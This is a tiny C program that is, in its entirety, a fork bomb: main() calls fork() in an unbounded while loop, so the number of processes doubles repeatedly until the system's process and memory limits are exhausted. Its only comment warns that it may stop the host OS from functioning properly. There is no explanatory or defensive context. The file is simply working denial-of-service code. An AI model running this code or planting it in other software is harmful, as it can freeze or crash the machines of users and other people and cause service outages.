#include <unistd.h>

// WARN: this program may lead the host OS not to function properly

int main()
{
	while (1) {
		fork(); 
	}

	return 0;
}
